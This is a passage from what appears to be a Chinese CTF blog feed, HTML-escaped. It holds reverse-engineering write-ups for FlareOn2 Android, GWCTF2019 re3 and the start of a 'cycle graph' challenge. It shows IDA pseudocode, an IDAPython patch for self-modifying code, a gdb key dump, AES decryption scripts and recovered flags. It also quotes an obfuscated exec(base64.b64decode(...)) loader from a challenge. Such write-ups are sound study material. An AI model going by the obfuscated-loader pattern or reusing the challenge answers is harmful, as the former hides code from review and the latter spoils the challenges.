OOO0000O0OO0OOOOO000O00O0OO0O00O &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Rbk51WXI4dmRaOXlwV3NvME0ySGp&amp;#39;&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# many lines&lt;/span&gt;
exec(base64&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;b64decode(OOO))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;把最后的exec改成print，查看一下代码，发现里面的字符串都被 &lt;code&gt;[::-1]&lt;/code&gt; 了，解一下发现其中一个就是flag&lt;/p&gt;
&lt;h2 id=&#34;flareon2android&#34;&gt;[FlareOn2]Android&lt;/h2&gt;
&lt;p&gt;so层逆向，程序是将前后两个输入合并，然后做一个质因数分解，手动dump了一下数据，然后写脚本（如果会idapython就好了，留下了不学无术的泪水.jpg）&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; libnum &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; f &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; extract:
	flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(len(f)):
		flag &lt;span style=&#34;color:#f92672&#34;&gt;*=&lt;/span&gt; pow(prime[i], f[i])
	print (n2s(flag)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode(), end &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)

print ()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>GWCTF2019 re3 writeup</title>
        <link>/post/gwctf2019-re3-writeup/</link>
        <pubDate>Thu, 08 Apr 2021 22:36:12 +0000</pubDate>
        
        <guid>/post/gwctf2019-re3-writeup/</guid>
        <description>&lt;h2 id=&#34;静态分析&#34;&gt;静态分析&lt;/h2&gt;
&lt;p&gt;首先通过关键字符串 &lt;code&gt;Wrong&lt;/code&gt; 进入 &lt;code&gt;main&lt;/code&gt; 函数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__fastcall&lt;/span&gt; __noreturn &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; a1, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;a2, &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;a3)
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+8h] [rbp-48h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; s[&lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;]; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+20h] [rbp-30h] BYREF
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v5; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+48h] [rbp-8h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  v5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; __readfsqword(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x28u&lt;/span&gt;);
  __isoc99_scanf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%39s&amp;#34;&lt;/span&gt;, s);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( (&lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)strlen(s) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt; )
  {
    puts(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Wrong!&amp;#34;&lt;/span&gt;);
    exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
  }
  mprotect(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;dword_400000, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF000uLL&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;223&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i )
    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;((_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)sub_402219 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; i) &lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x99u&lt;/span&gt;;
  sub_40207B((&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;unk_603170);
  sub_402219();
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;阅读一下代码，发现先是输入一个长度为32的字符串&lt;/p&gt;
&lt;p&gt;随后对一个奇怪的地址执行了一个函数，但这个地址和输入应该没有关系，可以暂时不管&lt;/p&gt;
&lt;p&gt;注意到有个 &lt;code&gt;for&lt;/code&gt; 循环对某一个地址的值做了个异或，最后又调用了这个地址，这是简单且经典的 SMC&lt;/p&gt;
&lt;p&gt;用 idapython patch 一下，用运行脚本功能，由于长度较短，直接在ida中手写了&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;start &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x402219&lt;/span&gt;
end &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; start &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;223&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(start, end &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;):
    patch_byte(i, get_wide_byte(i) &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x99&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;运行完后进入这个地址，好像不能在 &lt;code&gt;402219&lt;/code&gt; 处新建函数，只能在 &lt;code&gt;40221A&lt;/code&gt; 处按 p 键新建函数，F5 查看这个函数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__fastcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sub_40221A&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; a1)
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; v2; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+18h] [rbp-D8h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+1Ch] [rbp-D4h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; v4[&lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;]; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+20h] [rbp-D0h] BYREF
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; v5; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+E8h] [rbp-8h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  v5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; __readfsqword(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x28u&lt;/span&gt;);
  sub_400A71((&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;)v4, (&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;unk_603170);&lt;span style=&#34;color:#75715e&#34;&gt;// 经典密钥生成
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  sub_40196E((&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;)v4, a1);                  &lt;span style=&#34;color:#75715e&#34;&gt;// 这tm是AES
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  sub_40196E((&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt;)v4, a1 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;);
  v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i )
  {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_BYTE &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; a1) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; byte_6030A0[i] )
      v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; v2;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;最后的 &lt;code&gt;byte_6030A0&lt;/code&gt; 显然是加密结果的校验了&lt;/p&gt;
&lt;p&gt;上面有两个函数 &lt;code&gt;sub_400A71&lt;/code&gt; 和 &lt;code&gt;sub_40196E&lt;/code&gt;，&lt;code&gt;400A71&lt;/code&gt; 调用了之前出现的 &lt;code&gt;603170&lt;/code&gt; 猜测是一个密钥，&lt;code&gt;40196E&lt;/code&gt; 使用了两次，且分别是对输入的前一半与后一半的操作，猜测是加密函数。密钥生成和输入无关，完全可以通过动态调试得到结果，所以查看加密函数。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__fastcall&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;sub_401828&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; a1, &lt;span style=&#34;color:#66d9ef&#34;&gt;__int64&lt;/span&gt; a2)
{
  &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;__int8&lt;/span&gt; i; &lt;span style=&#34;color:#75715e&#34;&gt;// [rsp+1Fh] [rbp-1h]
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  sub_400B0A(&lt;span style=&#34;color:#ae81ff&#34;&gt;0LL&lt;/span&gt;, a1, a2);                      &lt;span style=&#34;color:#75715e&#34;&gt;// 这是aes哦
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; ( i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9u&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i )
  {
    sub_400BAC(a1);
    sub_400C1F(a1);
    sub_400D27(a1);
    sub_400B0A(i, a1, a2);
  }
  sub_400BAC(a1);
  sub_400C1F(a1);
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; sub_400B0A(&lt;span style=&#34;color:#ae81ff&#34;&gt;10LL&lt;/span&gt;, a1, a2);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;一开始被各个函数吓一跳，但点到某个函数里发现好像是 $4\times 4$ 的一个方阵，又发现某些函数重复出现的规则和 AES 很像，于是推测这个是 AES 加密算法，稍微看了下具体的函数实现，应该没有大问题，于是着手解密了。&lt;/p&gt;
&lt;h2 id=&#34;解密&#34;&gt;解密&lt;/h2&gt;
&lt;p&gt;首先动态调试拿到密钥&lt;/p&gt;
&lt;p&gt;直接步过这句代码： &lt;code&gt;sub_40207B((__int64)&amp;amp;unk_603170);&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;gdb-peda$ b *0x4021e4
Breakpoint &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; at 0x4021e4
gdb-peda$ c
gdb-peda$ n
gdb-peda$ x/50x 0x603170
0x603170:       0xcb    0x8d    0x49    0x35    0x21    0xb4    0x7a    0x4c
0x603178:       0xc1    0xae    0x7e    0x62    0x22    0x92    0x66    0xce
0x603180:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;拿到密钥&lt;/p&gt;
&lt;p&gt;随后直接到 ida 相应地址中取出密文&lt;/p&gt;
&lt;p&gt;用之前写过的 AES 脚本解密&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; my_aes
&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; libnum &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; n2s

key     &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xcb8d493521b47a4cc1ae7e62229266ce&lt;/span&gt;
cipher1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xBC0AADC0147C5ECCE0B140BC9C51D52B&lt;/span&gt;
cipher2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x46B2B9434DE5324BAD7FB4B39CDB4B5B&lt;/span&gt;

print(n2s(my_aes&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;aes_encrypt(cipher1, key)), end &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)
print(n2s(my_aes&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;aes_encrypt(cipher2, key)))
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;输出如下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;flag{924a9ab2163&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;d390410d0a1f670}&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;得到 flag&lt;/p&gt;
</description>
        </item>
        <item>
        <title>高校战役 re writeups</title>
        <link>/post/gxzy-re-writeups/</link>
        <pubDate>Wed, 31 Mar 2021 20:33:02 +0000</pubDate>
        
        <guid>/post/gxzy-re-writeups/</guid>
        <description>&lt;ul&gt;
&lt;li&gt;cycle graph&lt;/li&gt;
&lt;li&gt;天津垓&lt;/li&gt;
&lt;li&gt;fxck&lt;/li&gt;
&lt;li&gt;easyparser&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;cycle-graph&#34;&gt;cycle graph&lt;/h2&gt;
&lt;h3 id=&#34;逆向代码&#34;&gt;逆向代码&lt;/h3&gt;
&lt;p&gt;根据提示，这是一道纯算法题，拖到 ida 中，根据关键字符串定位到关键函数。查看核心代码&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;  dword_403370 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;unk_403384;
  byte_403374 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt;;
  v2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
  dword_403378 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;unk_403380;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;
  {
    v3 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; dword_402178[v2];
    &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;v2;
    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(v1 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v3;
    &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;v1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;unk_403380 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; dword_402274[v2];
    v1[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;unk_403380 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; dword_4021F4[v2];
    v1 &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;;
  }
  &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; ( (&lt;span style=&#34;color:#66d9ef&#34;&gt;signed&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)v1 &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;signed&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;unk_403504 );
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面的代码是主函数开头的初始化部分&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;  sub_401020(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;You need a flag to get out of this:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, a1);
  scan(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%s&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;input);
  v4 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; dword_403370;                            &lt;span style=&#34;color:#75715e&#34;&gt;// 0
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  v5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; byte_403374;                             &lt;span style=&#34;color:#75715e&#34;&gt;// 48
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  v6 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;;
  v7 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; dword_403378;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;do&lt;/span&gt;
  {
    v11 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;input &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v6);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)v7 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v5 &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; v11 )
    {
      v7 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(v7 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;);
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
    {
      &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ( v5 &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)v7 &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; v11 )
      {
        sub_401020(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;This is not flag~&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;, v10);
        system(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pause&amp;#34;&lt;/span&gt;);
        exit(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;);
      }
      v7 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_DWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)(v7 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;);
    }
    v5 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;input &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; v6);
    &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;v4;
    &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;v6;
    byte_403374 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v5;
    dword_403378 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; v7;
